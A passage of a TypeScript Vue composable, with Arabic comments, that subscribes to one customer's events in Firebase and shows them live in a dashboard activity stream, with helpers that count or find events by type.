      ? safe.createdAt
      : new Date(0).toISOString();
  const page = typeof safe.page === "string" ? safe.page : undefined;
  const message =
    typeof (safe as { message?: unknown }).message === "string"
      ? ((safe as { message?: string }).message as string)
      : undefined;

  return {
    id: rawKey,
    type,
    payload,
    createdAt,
    page,
    message,
  };
};

// يصف هذا الـ composable اشتراكاً مباشراً على أحداث عميل محدَّد في
// `${firebasePaths.events}/${customerId}`. يُستخدم من لوحة التحكم لعرض
// سجل نشاط العميل (Activity Stream) بشكل لحظي.
//
// - عند تغيير `customerId` يتم فك الاشتراك القديم تلقائياً وإنشاء اشتراك جديد.
// - عند `null`/فارغ لا يحدث أي اشتراك وتبقى القائمة فارغة.
// - عند إزالة المكوّن (onBeforeUnmount) يتم تنظيف الاشتراك.
export const useCustomerActivityStream = (
  customerId: Ref<string | null | undefined> | (() => string | null | undefined),
) => {
  const events = ref<CustomerActivityEvent[]>([]);
  const loading = ref(false);
  const error = ref("");
  let unsubscribe: (() => void) | null = null;

  const resolveId = (): string => {
    if (typeof customerId === "function") return customerId() || "";
    return customerId?.value || "";
  };

  const stopListening = () => {
    if (unsubscribe) {
      try {
        unsubscribe();
      } catch (err) {
        console.warn("Failed to unsubscribe customer activity stream", err);
      }
      unsubscribe = null;
    }
  };

  const startListening = async (id: string) => {
    if (!import.meta.client) return;
    if (!id) {
      events.value = [];
      return;
    }

    stopListening();
    loading.value = true;
    error.value = "";

    try {
      const db = await getFirebaseDatabase();
      const databaseModule = await import("firebase/database");
      const eventsRef = databaseModule.ref(db, `${firebasePaths.events}/${id}`);

      unsubscribe = databaseModule.onValue(
        eventsRef,
        (snapshot) => {
          const raw = snapshot.val() as Record<string, Record<string, unknown>> | null;
          if (!raw) {
            events.value = [];
            loading.value = false;
            return;
          }

          const list = Object.entries(raw)
            .map(([key, val]) => normalizeCustomerEvent(key, val))
            .filter((e) => e && e.id);

          // ترتيب من الأحدث للأقدم حتى تظهر بطاقة "إعادة الإرسال" في الأعلى.
          events.value = list.sort((a, b) =>
            (b.createdAt || "").localeCompare(a.createdAt || ""),
          );
          loading.value = false;
        },
        (reason) => {
          error.value = reason?.message || "تعذر تحميل سجل نشاط العميل";
          loading.value = false;
        },
      );
    } catch (reason) {
      error.value =
        reason instanceof Error ? reason.message : "تعذر الاتصال بقاعدة البيانات";
      loading.value = false;
    }
  };

  // دالة مساعدة: تُعيد أحدث حدث من نوع معيّن (مثلاً otp_resend_clicked).
  const latestOfType = (type: string): CustomerActivityEvent | null => {
    if (!type) return null;
    return events.value.find((e) => e?.type === type) || null;
  };

  // دالة مساعدة: عدد مرات تكرار حدث معيّن.
  const countOfType = (type: string): number => {
    if (!type) return 0;
    return events.value.filter((e) => e?.type === type).length;
  };

  if (typeof customerId !== "function") {
    // في حال تم تمرير Ref، اربط التغييرات ببدء/إيقاف الاشتراك.
    watch(
      () => customerId?.value || "",
      (id) => {
        void startListening(id);
      },
      { immediate: true },
    );

    onBeforeUnmount(() => {
      stopListening();
      events.value = [];
    });
  } else {
    // في حال تم تمرير دالة getter، نبدأ فوراً (المستدعي مسؤول عن دورة الحياة).
    void startListening(resolveId());
  }

  return {
    events,
    loading,
    error,
    stopListening,
    latestOfType,
    countOfType,
  };
};

